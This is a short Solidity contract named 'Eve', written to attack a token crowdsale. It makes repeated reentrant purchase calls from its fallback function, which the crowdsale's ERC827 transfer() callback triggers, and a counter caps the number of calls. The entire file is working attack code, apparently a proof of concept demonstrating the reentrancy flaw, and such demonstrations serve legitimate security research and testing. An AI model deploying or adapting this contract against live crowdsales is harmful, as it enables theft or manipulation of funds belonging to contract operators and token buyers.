pragma solidity ^0.4.21;

contract Eve {

  
       //The amount of wei that is sent in each call to the crowdsale. 
       uint public tokenAmount;
       
       //The address of the crowdsale that we're attacking
       address victim;
       
       //The number of reentrant calls to the crowdsale that Eve has already made.
       uint numberOfReentrantCalls;
       
       //The number of times Eve's fallback function should buy more tokens from the crowdsale
       uint n;
       
       //The constructor is payable so Eve can be initialized with enough wei to buy tokens in the crowdsale.
       function Eve() public payable {}

   
    /**
     * @dev Sends _amount wei to the crowdsale contract to buy tokens.
     * @param _a Address of the crowdsale contract
     * @param _amount Amount of wei to send
     * @param _n Number of reentrant calls to make 
     */
    function exploitReentrancy(address _a, uint _amount, uint _n) public {
        numberOfReentrantCalls = 0;
        n = _n;
        tokenAmount = _amount;
        victim = _a;
        victim.call.value(_amount)();
        }

  

    /**
     *@dev Eve's fallback function, is called by the crowdsale's ERC827 transfer() function. 
     */
    
    function() payable public {
        //check if we want to perform a reentrancy attack at all
        if(n>0) {
         //check if all the desired reentrant calls have already been performed   
        if(numberOfReentrantCalls >= n) {
            return;
       }
        numberOfReentrantCalls++;
       
       //buy more tokens from the crowdsale
        victim.call.value(tokenAmount)();
        
       }

        
    }
    
    
   
    
    
}
